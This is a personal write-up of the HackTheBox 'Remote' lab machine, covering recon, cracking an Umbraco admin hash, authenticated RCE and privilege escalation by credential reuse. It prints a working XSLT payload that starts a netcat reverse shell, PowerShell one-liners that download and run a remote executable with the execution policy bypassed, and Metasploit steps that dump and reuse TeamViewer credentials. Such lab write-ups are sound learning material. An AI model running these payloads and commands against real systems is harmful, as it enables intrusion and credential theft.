# CTF Writeup: HackTheBox - [Remote](https://www.hackthebox.eu/home/machines/profile/234)

In 2020 (thanks to COVID lockdowns), I started working on HackTheBox challenges. So far I have pwned/rooted 7 machines and it is too much fun! I finally got some time to go through my notes and decided to write this brief walkthrough to the [Remote](https://www.hackthebox.eu/home/machines/profile/234) machine.

This is not going to be a full wript-up with detailed steps, I am just going to skip over to most interesting findings. It goes without saying that there was hours of research between each stage and a lot of learning.

* Starting off with an NMAP Scan:

```
ports=$(sudo nmap -p- --min-rate=1000 -T4 10.10.10.180 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
sudo nmap -sC -sV -p$ports 10.10.10.180
```
We get a huge list of open ports and services:

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-05-31T11:01:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.11 seconds

```

* As usual, I went through most of the well known ports to explore the attack surface:
    - Start dirbuster on web applications
    - Start manually browsing the web content
    - Attempt manual connections to ftp and mountd services
    - Fire up msfconsole and run some recon against netbios and rpc

* I hit two interesting leads in the recon:
   - Dirbuster found bunch of content on port 80
   
      ```
      GENERATED WORDS: 4612

      ---- Scanning URL: http://10.10.10.180/ ----
      + http://10.10.10.180/about-us (CODE:200|SIZE:5441)
      + http://10.10.10.180/blog (CODE:200|SIZE:5001)
      + http://10.10.10.180/Blog (CODE:200|SIZE:5001)
      + http://10.10.10.180/contact (CODE:200|SIZE:7880)
      + http://10.10.10.180/Contact (CODE:200|SIZE:7880)
      + http://10.10.10.180/home (CODE:200|SIZE:6703)
      + http://10.10.10.180/Home (CODE:200|SIZE:6703)
      + http://10.10.10.180/install (CODE:302|SIZE:126)
      + http://10.10.10.180/intranet (CODE:200|SIZE:3323)
      + http://10.10.10.180/master (CODE:500|SIZE:3420)
      + http://10.10.10.180/people (CODE:200|SIZE:6739)
      + http://10.10.10.180/People (CODE:200|SIZE:6739)
      + http://10.10.10.180/person (CODE:200|SIZE:2741)
      + http://10.10.10.180/product (CODE:500|SIZE:3420)
      + http://10.10.10.180/products (CODE:200|SIZE:5328)
      + http://10.10.10.180/Products (CODE:200|SIZE:5328)
      + http://10.10.10.180/umbraco (CODE:200|SIZE:4040)
      ```
   - Umbraco is a CMS so I used a [Umbraco discovery wordlist](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/CMS) and discovered the login page 
   
      ` http://10.10.10.180/umbraco#/login/false?returnPath=%252Fumbraco`
   - Second important discovery:
      - I was able to mount a volume using the mountd service
        
        `mount 10.10.10.180:/site_backups site_backups/`
      - It contained a directory called `App_data` with file `Umbraco.sdf`
      - A quick google search reveals it's a database file
      - Not sure how to open this file, I just drag and dropped it into my VSCode editor and instantly noticed a plain text string in load of garbage 
        
          `Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}`
      - BAM! There it is, the SHA1 hash for the Umbraco Administrator's password. But how do I crack it?
      - Well, I just googled how to crack SHA1 hash, in top results I see `https://crackstation.net/`, paste the hash into this website, and BAM! `baconandcheese` is the password!
      - Login to the Umbraco CMS as admin
 
* Next step is to somehow get code execution. So I re-visited exploit-db and noticed [Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/46153) exploit. The word authenticated caught my eye and I was quite sure this exploit has to work. Of course, it didn't work.
* After bit of tinkering with the payload, I modified it to obtain a reverse shell using nc back to my kali machine:

```
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "10.10.14.23:4449"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "nc.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> '
```
Got the user flag `type c:\Users\Public\user.txt`
 
* Now for finding privilege escalation to root, I spent too much time looking around the system and finding missing patches, etc but no luck. Hmm, the name of the machine is `remote` so there must be a remote access service that we can exploit. Did some service enumeration and found that TeamViewer is running. That's probably the way in.

* In Metasploit, I noticed `windows/gather/credentials/teamviewer_passwords` module. So I spent the time to now get a proper shell into my msfconsole. I ended up using following commands in my existing reverse shell:

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.25:8000/rshell.exe');"

powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.25:8000/rshell.exe',"$env:APPDATA\rshell.exe");Start-Process ("$env:APPDATA\rshell.exe")
```

* Once I had the session in msfconsole, I run the `windows/gather/credentials/teamviewer_passwords` module and BAM!

  ```
  TeamViewer Client ID - 1769137322
  Unattended Password: !R3m0te!
  ```
  
* Now, I tried many ways to use these credentials to actually connect to the target machine using TeamViewer client but it did not work. I could not figure out what was going on. So I slept over it.
* Next day, I was working and spent most of my day in Zoom meetings with my colleagues. At one point, there were disucssions about a phishing incident and re-using passwords. After tiring day of Zoomming, as I was recollecting my thoughts I realized the risks of **re-using passwords** and how it may be the trick in this HackTheBox challenge. 
* It would be too easy I said to myself, but decided to give it a try anyway. Fired up msfconsole, 

```
use windows/smb/psexec
SMBUSer administrator
SMBPass !R3m0te!
```

and BAM! I could not believe it worked. And as easy as that, we get the root flag!
